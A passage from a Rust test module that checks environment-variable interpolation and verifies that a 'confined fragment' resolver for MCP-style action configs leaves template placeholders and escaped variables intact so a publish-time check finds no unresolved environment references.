        let text = format!("url: https://x/${{{SECRET_VAR}}}\n");
        assert_eq!(
            interpolate_env_vars(&text),
            format!("url: https://x/{SECRET_VALUE}\n")
        );
    }

    #[test]
    fn a_confined_fragment_leaves_the_publish_check_nothing_to_report() {
        // `unresolved_env_references` refuses an authority document that
        // still carries a live `${VAR}`. A confined fragment must never
        // trip it, because the confined pass refuses rather than leaving
        // one behind.
        let _env = secret_env();
        let fragment = "action:\n  type: mcp\n  arg: \"${args.user_id}\"\n  escaped: \"$${HOME}\"\n  header: \"{{request.headers.x}}\"\n  rps: \"{{vars.rps}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("rps", serde_json::json!(10))]),
        )
        .expect("nothing here is an environment reference");
        assert!(
            unresolved_env_references(&out).is_empty(),
            "the publish-time check misfired on a confined fragment: {:?}",
            unresolved_env_references(&out)
        );
        assert!(out.contains("${args.user_id}"), "{out}");
        assert!(out.contains("$${HOME}"), "{out}");
        assert!(out.contains("{{request.headers.x}}"), "{out}");
        assert!(out.contains("10"), "{out}");
    }
}
